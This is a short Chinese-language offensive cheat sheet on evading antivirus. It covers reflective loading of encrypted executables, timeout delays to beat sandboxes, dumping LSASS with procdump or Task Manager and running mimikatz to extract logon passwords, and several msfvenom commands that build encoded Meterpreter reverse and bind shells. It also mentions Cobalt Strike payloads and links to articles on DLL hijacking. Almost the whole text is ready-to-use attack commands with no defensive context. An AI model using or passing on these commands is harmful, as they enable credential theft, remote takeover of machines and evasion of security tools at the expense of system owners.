普通 exe 免杀使用 py 或 go 等加密后反射加载，基本上就可以过大部分杀软了。
启动后 cmd /c timeout 延迟等待N秒用来反沙箱

procdump+mimikatz,  mimikatz很多时候都会被杀掉，可以通过procdump+mimikatz的方式 进行绕过。 或 任务管理器—进程—显示所有用户进程—找到lsass(Local Security Authority Process)—右键“创建转储文件”
- mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exit">pass.txt

msf

```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.50.161 LPORT=1234 -e x64/shikata_ga_nai -i 5 -f exe > shell.exe
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1234 -e x86/shikata_ga_nai -i 15  -f c -o payload_bind.txt
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1234 -e x86/shikata_ga_nai -i 15  -f csharp -o payload_bind.txt
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1234 -f c > payload.c
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.127.134 LPORT=1234 -f c > payload.c
```

cobalt strike
生成 payload C 版本。用掩日生成一下。

# Article

- rw\_bypass\_免杀\_BypassAV.html
- [有手就行的白加黑实战免杀 - FreeBuf 网络安全行业门户](https://www.freebuf.com/articles/system/333690.htm)
- [一文读懂 DLL 劫持与白+黑样本原理](https://mp.weixin.qq.com/s/UZjLNPna7R2ZLs3r9kJEQg)
